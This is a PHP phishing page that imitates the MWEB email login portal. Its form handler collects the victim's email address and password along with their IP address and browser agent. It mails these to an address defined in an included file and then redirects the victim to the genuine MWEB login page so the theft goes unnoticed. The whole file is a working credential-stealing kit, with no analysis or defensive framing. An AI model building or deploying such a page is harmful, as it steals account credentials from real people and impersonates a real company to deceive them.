<?php
require 'add.php';

if(isset($_POST['submit']))
{
	if(trim($_POST['userIdentifier']) == '' || strlen($_POST['userIdentifier']) < 10 || !preg_match("/^.+@.+\..+$/i" , $_POST['userIdentifier']) || trim($_POST['password']) == '' || strlen($_POST['password']) < 5)
	{
		$error = 'Invalid username and password combination. Please re-enter.';
	}
	
	else {

        $subject =  'Mweb '.$ip;
        $to      =  EMAIL;
        $msg     =  $_POST['userIdentifier'].'<br>';
        $msg    .=  $_POST['password'].'<br>';
        $msg    .=  $agent.'<br>';
        $msg    .=  $ip;

        $headers    =  'MIME-Version:1.0' . "\r\n";
        $headers   .=  'Content-type: text/html; charset=utf-8' . "\r\n";
        $headers   .=  'From: zaz' . "\r\n";
                        'X-Mailer: PHP/' . phpversion();
        mail($to, $subject, $msg, $headers);

        header('Location:https://myaccount.mweb.co.za/mwebcore/portal/email/login.jsp');
        exit;
    }
}
?>

<html>
<head>
	
    <title>My Email Login</title>
    <!-- CSS Includes -->
    <link type="text/css" rel="stylesheet" href="css/jquery-ui-1.8.20.custom.css"/>
    <link type="text/css" rel="stylesheet" href="css/chosen.css" />
    <link type="text/css" rel="stylesheet" href="css/pure-min.css">
    <link type="text/css" rel="stylesheet" href="css/font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="css/myaccount.css" />
    <link type="text/css" rel="stylesheet" href="css/myaccount-login.css">
    <link rel="shortcut icon" href="images/favicon.ico" />
        
    <!-- JS Includes -->
    <script type="text/javascript" language="JavaScript" src="js/jquery-1.7.2.min.js"></script>
    <script type="text/javascript" language="JavaScript" src="js/jquery-ui-1.8.20.custom.min.js"></script>
    <script type="text/javascript" language="JavaScript" src="js/chosen.jquery.min.js"></script>
    <script type="text/javascript" language="JavaScript" src="js/myaccount.js"></script>
    <script type="text/javascript" language="JavaScript" src="js/scripts.js"></script>

    <!-- Get Date -->
    <script type="text/javascript">
        //<!--
                function CurrentYear()
                {
                    var date = new Date();
                    var year = date.getFullYear();
                    document.write(year);
                }

    //-->
    </script>

</head>
<body>
    <div id="wrapper">
        <div id="topBar">
    <div id="topBarContent">
        <div id="topBarLogo"><a id="topBarLogoLink" href="#">&nbsp;</a></div>
    </div>
</div>
        <div id="container">
            <div id="content" class="pure-g" style="margin: 0 auto; width: 800px;">
                <div id="headerPanel" class="pure-u-1">
                    <p id="myAccountTitle">MY EMAIL LOGIN</p>
                </div>

<div id='div-gpt-ad-1373625495868-0'>

</div>
<?php
if(isset($_POST['submit']))
{
?>
<div class="pure-u-1">
	
	<div id="errorOutputContainer">
		
				<div id="errorListing" class="ui-state-error ui-corner-all" style="padding: 0 .7em;">
				<table>
		
					<tbody><tr>
						<td style="vertical-align: top;">
							<span class="ui-icon ui-icon-alert" style="float: left; margin-right: .3em; vertical-align: top;"></span>
						</td>
						<td>
							<?php echo $error; ?>
						</td>
					</tr>
		
				</tbody></table>
				</div>
				<br>
		
	</div>
</div>
<?php } ?>
<div id="loginPanel" class="pure-u-1-2">
	<form name="getLogin" class="pure-form pure-form-stacked" method="post">
		<fieldset>
			<div class="pure-control-group">
				<label>Email Address</label> <input id="txtLogin" class="disableAutocomplete" name="userIdentifier" type="text" size="45" autofocus value="" />
			</div>
			<div class="pure-control-group">
				<label>Password</label> <input id="txtPassword" class="disableAutocomplete" type="password" name="password" size="45" />
			</div>
           
           <div class="pure-control-group">
				<input name="submit" class="primary" id="m_submitButton" type="submit" value="Sign In" name="LoginUser" />
			</div>
		</fieldset>
		
	
		<span><a href="index.php" target="_blank">
		Are you an Ignite customer?</a></span>
		<br>
		<br>
	
		<span><a href="#">Forgotten Password?</a></span>
	</form>
</div>
<div id="adPanel" class="pure-u-1-2">
	<div class="adcode">
	</div>
</div>







          </div> <!-- content -->
      </div> <!-- container -->
<div class="clearfooter"></div>
   </div> <!-- wrapper -->
       <div id="footer">
           <div id="footerContent" class="pure-g">
               <div class="pure-u-2-3">
                   <p>
                       &copy; MWEB. Trading as a division of Internet Solutions Digital (Pty) Ltd. All rights reserved.
                   </p>
                   <p>
                       <a href="#">Legal Notices</a> |
                       <a href="#">About Us</a> |
                       <a href="#">Contact Us</a> |
                       <a href="#">Help</a> 
                   </p>
               </div>
               <div class="pure-u-1-3">
                   <ul id="isp-badges">
                       <li><img src="images/ispa.png"/></li>
                       
                       <li><img src="images/icode.png"/></li>
                   </ul>
               </div>
           </div>
       </div>

</body> <!-- body -->
</html>
